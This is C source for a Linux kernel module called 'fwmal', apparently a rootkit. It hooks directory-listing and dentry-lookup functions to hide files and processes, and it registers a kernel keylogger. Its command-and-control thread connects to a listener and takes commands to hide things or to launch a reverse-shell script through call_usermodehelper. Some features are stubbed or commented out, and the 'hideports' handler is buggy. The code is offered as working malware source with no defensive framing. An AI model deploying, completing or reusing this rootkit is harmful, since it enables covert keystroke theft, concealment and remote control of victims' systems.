#include <linux/kernel.h>
#include <linux/module.h>
#include<linux/in.h>
#include <linux/init.h>
#include <linux/moduleparam.h>
#include<linux/inet.h>
#include<linux/socket.h>
#include<net/sock.h>
#include <linux/icmp.h>
#include<linux/init.h>
#include <linux/tcp.h>
#include <net/inet_sock.h>
#include <linux/ip.h>
#include<linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/keyboard.h>
#include <linux/list.h>
#include <linux/sched.h>   //wake_up_process()
#include <linux/kthread.h> //kthread_create()、kthread_run()
#include <linux/err.h>           //IS_ERR()、PTR_ERR()2.实现（kthread_create 与kthread_run区别）
#include "khook/engine.c"

#define MAGIC_ID 11111
#define PORT 8889
#define ADRESS "127.0.0.1"
#define BUFFER_SIZE 1024
#define SLEEP_TIME 10*1000
#define HIDEFILE "fwmal"
//static struct nf_hook_ops my_nf_hook;
struct task_struct *background_task;
atomic_t background_exit;
struct socket *socket;
struct sockaddr_in s_addr;

LIST_HEAD(files);
struct fwmal_filename{
	char* name;
	struct list_head list;
};


LIST_HEAD(procs);
struct fwmal_procs{
	long pid;
	struct list_head list;
};

LIST_HEAD(ports);
struct fwmal_ports{
	unsigned short port;
	struct list_head list;
};

int addport(unsigned short port){
	struct fwmal_ports *fwmal_port = kmalloc(sizeof(struct fwmal_ports), GFP_KERNEL);
	fwmal_port->port = port;
	list_add_tail(&fwmal_port->list,&ports);
	printk("[fwmal]: port is %hu",port);
	return 0;
}

int deletport(unsigned short port){
	struct list_head* ld;
	list_for_each(ld,&ports){
		if(container_of(ld,struct fwmal_ports,list)->port == port){
			list_del(ld);
			return 0;
		}
	}
	return -1;
}

int addpid(long pid){
	struct fwmal_procs *proc = kmalloc(sizeof(struct fwmal_procs), GFP_KERNEL);
	proc->pid = pid;
	list_add_tail(&proc->list,&procs);
	//printk("[fwmal]: pp %ld \n",pid);
	return 0;
}

int deletepid(long pid){
	struct list_head* ld;
	list_for_each(ld,&procs){
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			list_del(ld);
			return 0;
		}
	}
	return -1;
}


int addfile(const char* name){
	struct fwmal_filename *file = kmalloc(sizeof(struct fwmal_filename), GFP_KERNEL);
	file->name = kmalloc(strlen(name)+1, GFP_KERNEL);
	memcpy(file->name, name, strlen(name));
	file->name[strlen(name)] = '\0';
	list_add_tail(&file->list, &files);
	//printk("[fwmal]:ssss%s\n",file->name);
	return 0;
}

int deletefile(struct fwmal_filename* file){
	list_del(&file->list);
	kfree(file->name);
	kfree(file);
	return 0;
}

/*
Linux内核中
struct keyboard_notifier_param {
	struct vc_data *vc;	// VC on which the keyboard press was done
	int down;		// Pressure of the key?
	int shift;		// Current shift mask
	int ledstate;		// Current led state
	unsigned int value;	// keycode, unicode value or keysym
};
*/
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	printk("[fwmal]: enter keylogger");
	if (code == KBD_KEYCODE)
	{
		printk("[fwmal]:%d\n",param->down);
		printk("[fwmal]:%d\n",param->shift);
		printk("[fwmal]:%d\n",param->ledstate);
		printk("[fwmal]:%d\n",param->value);
	}
	return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	struct list_head* ld;
	int ret = 0;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}

	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
}


KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}

	ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}

	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}

	ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){ return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}

	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}

	ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	
	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}
	
	ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}

	pid = simple_strtol(name, &endp, 10);
	list_for_each(ld,&procs){
		//printk("[fwmal]:pid is %ld \n",container_of(ld,struct fwmal_procs,list)->pid);
		if(container_of(ld,struct fwmal_procs,list)->pid == pid){
			return ret;
		}
	}

	ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
{
	struct dentry *found = NULL;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name->name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){return found;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v){
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	unsigned short dport;
	//unsigned int daddr;
	struct list_head* ld;

	inet = (struct inet_sock *)sk;
	dport = inet->inet_dport;
	//daddr = inet->inet_daddr;
	list_for_each(ld,&ports){
		if(container_of(ld,struct fwmal_ports,list)->port == dport)
			printk("[fwmal]:iii%hd",dport);
	}
	
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
	return ret;
}


/*
#include <linux/fs.h> // has inode_permission() proto
KHOOK(inode_permission);
static int khook_inode_permission(struct inode *inode, int mask)
{
	int ret = 0;
	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
	printk("[fwmal]:%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
	return ret;
}

#include <linux/binfmts.h> // has no load_elf_binary() proto
KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = 0;
	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
	printk("[fwmal]:%s(%p) = %d\n", __func__, bprm, ret);
	return ret;
}
*/

/*
netfilter 钩子函数

unsigned int packet_hook(const struct nf_hook_ops *ops,
				struct sk_buff *socket_buffer,
				const struct net_device *in,
				const struct net_device *out, 
				int (*okfn)(struct sk_buff *))
{
	//printk("[fwmal]:acctpt packet\n");
	struct iphdr iph;
	//读出ip头
	const struct iphdr *ip_header = skb_header_pointer(socket_buffer, 0, sizeof(iph), &iph);
	if (!ip_header)
		return NF_ACCEPT;
	if (!ip_header->protocol)
		return NF_ACCEPT;

	if (ip_header->protocol == IPPROTO_TCP) {
		struct tcphdr tcph;
		//读出tcp头，ihl为ip包首部长度，单位为4字节
		const struct tcphdr *tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(tcph), &tcph);
		if (!tcp_header)
			return NF_ACCEPT;
		int size = htons(ip_header->tot_len) - sizeof(iph) - sizeof(tcph);
		char *data = kmalloc(size, GFP_KERNEL);
		char *string = kmalloc(size + 1, GFP_KERNEL);
		const char *tcp_data = skb_header_pointer(socket_buffer,ip_header->ihl * 4 + sizeof(struct tcphdr),size, &_data);
		
	}

	return NF_ACCEPT;
}

void init_nf(void)
{
	my_nf_hook.hook = (void *)packet_hook;
	my_nf_hook.pf = PF_INET;
	my_nf_hook.priority = NF_IP_PRI_FIRST;
	my_nf_hook.hooknum = NF_INET_PRE_ROUTING;
	nf_register_hook(&my_nf_hook);
}
*/

/*
字符串功能描述
0、exit：退出，在fwmal_thread中处理
1、shell：生成shell
2、hidefile：隐藏文件
3、hidethread：隐藏进程
4、hideports：隐藏端口
5、getnetpacket：获取网络包
6、getkeyboard：获取键盘输入
*/
int parse(char* buf){
	/*
	char* path = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	char* start = "/usr/bin/python";
	char* arg = "/home/likaiming/workspace/fwmal/script/reverse_shell.py";
	char *envp[] = {path, NULL};
	char *argv[] = {start, arg, NULL};
	*/

	char cmd_path[] = "/usr/bin/python";  
	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/script/reverse_shell.py", NULL};  
	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};  
	
	/*
	char cmd_path[] = "/usr/bin/touch";  
	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/test.txt", NULL};  
	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
	*/
	printk("[fwmal]:parse\n");
	if(strcmp(buf,"shell") == 0){
		return call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_EXEC); //call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	}else if(strcmp(buf,"hidefile")==0){
		printk("[fwmal]:hidefile");
		addfile(buf+9);
	}else if(strcmp(buf,"hidethread") ==0){
		printk("[fwmal]:hidethread");	
		addpid(simple_strtoull(buf+11,NULL,0));
	}else if(strcmp(buf,"hideports") ==0){
		printk("[fwmal]:hideports");	
		addpid((unsigned short)simple_strtoull(buf+11,NULL,0));
	}
	
	return 0;
}

int fwmal_thread(void* data)
{
	int ser;
	struct msghdr send_msg, recv_msg;
	struct kvec send_vec, recv_vec;
	char *send_buf = NULL;
	char *recv_buf = NULL;
	int ret;
	printk("[fwmal]:enter fwmal thread\n");
	while(atomic_read(&background_exit) == 0){
		printk("[fwmal]:begin connect\n");
		ser = socket->ops->connect(socket,(struct sockaddr *)&s_addr, sizeof(s_addr),0);
		if(ser!=0){
			printk("[fwmal]:connect fail\n");
			msleep(SLEEP_TIME);
			continue;
		}
		//进入交互逻辑
		printk("[fwmal]:connect ok\n");
		recv_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
		send_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
		memset(send_buf, 'a', BUFFER_SIZE);
		memset(&send_msg, 0, sizeof(send_msg));
		memset(&send_vec, 0, sizeof(send_vec));
		send_vec.iov_base = send_buf;
		send_vec.iov_len = BUFFER_SIZE;

		memset(recv_buf, 0, BUFFER_SIZE);
		memset(&recv_vec, 0, sizeof(recv_vec));
		memset(&recv_msg, 0, sizeof(recv_msg));
		recv_vec.iov_base = recv_buf;
		recv_vec.iov_len = BUFFER_SIZE;

		while(1){
			printk("[fwmal]:recv begin\n");
			ret = kernel_recvmsg(socket, &recv_msg, &recv_vec, 1, 1024, 0);
			if(ret<0) break;
			printk("[fwmal]:%s\n",recv_buf);
			if(strcmp(recv_buf,"exit") == 0) break;
			else
				ret = parse(recv_buf);
			ret = kernel_sendmsg(socket, &send_msg, &send_vec, 1, BUFFER_SIZE);
			if(ret<0) break;
		}
		msleep(SLEEP_TIME);
	}
	return 0;
}

void init_thread(void)
{
	//初始化socket相关内容
	memset(&s_addr,0,sizeof(s_addr));
	s_addr.sin_family=AF_INET;
	s_addr.sin_port=htons(PORT);
	s_addr.sin_addr.s_addr=in_aton(ADRESS);
	socket = (struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
	sock_create_kern(&init_net,AF_INET, SOCK_STREAM,0,&socket);

	//初始化内核线程
	background_task = kthread_create(fwmal_thread,NULL,"fwmal_thread");//&init_net,void (*fwmal_thread)(void)
	wake_up_process(background_task);
}

static int __init fwmal_init(void)
{
	int ret = khook_init();
	atomic_set(&background_exit,0);
	if (ret != 0)
		goto out;
	//init_thread();
	//init_nf();
	//ret = parse("hidefile");
	//addfile("fwmaltest\0qweqe");
	//addpid(1);
	//addport(47006);

	register_keyboard_notifier(&keylogger_nb);

	//printk("[fwmal]:%d\n",ret);
	printk("[fwmal]:Hello World\n");
out:
	return ret;
}

static void __exit fwmal_exit(void)
{
	printk(KERN_ALERT "[fwmal]:Goodbye World\n");
	atomic_add(1,&background_exit);
	khook_cleanup();
}

module_init(fwmal_init);
module_exit(fwmal_exit);
MODULE_LICENSE("GPL");
